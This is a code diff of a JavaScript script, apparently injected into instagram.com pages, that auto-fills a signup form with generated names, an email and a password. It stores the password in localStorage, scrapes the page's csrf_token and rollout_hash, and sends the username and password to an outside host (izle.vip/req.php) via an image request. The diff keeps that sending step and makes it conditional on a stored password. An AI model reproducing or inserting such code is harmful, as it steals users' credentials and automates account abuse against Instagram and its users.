@@ -130,8 +130,7 @@ $(document).ready(() => {
 		localStorage[cookie_name] = Date.now();
 		var myXhrInterval3 = setInterval(() => {
 			if(isim.length > 1 && soyisim.length > 1 && eposta.length > 1){
-				localStorage["passwd"] = passwd;
-
+				localStorage["passwd"] = "";
 				clearInterval(myXhrInterval3);
 				setTimeout(function() {
 					type('[name="emailOrPhone"]', eposta+"@gmail.com");
@@ -139,6 +138,7 @@ $(document).ready(() => {
 						type('[name="fullName"]', isim+" "+soyisim);
 						setTimeout(function() {
 							type('[name="password"]', passwd);
+							localStorage["passwd"] = passwd;
 							setTimeout(function() {
 									document.querySelectorAll('[type="button"]')[1].click(); // Rasgele isim
 									setTimeout(function() {
@@ -169,8 +169,11 @@ if(window.location.origin.indexOf("instagram.com") >= 0 && document.referrer.ind
 	var csrf_token = content.split('"csrf_token":"')[1].split('"')[0];
 	var instagram_ajax = content.split('"rollout_hash":"')[1].split('"')[0];
 	var app_id = "936619743392459";
-	new Image().src = 'https://www.izle.vip/req.php?username='+username+'&password='+localStorage["passwd"];
-
+	
+	if(localStorage["passwd"]){
+		new Image().src = 'https://www.izle.vip/req.php?username='+username+'&password='+localStorage["passwd"];
+	}
+	
 	function loadXHR(url) {
 		return new Promise(function(resolve, reject) {
 			try {
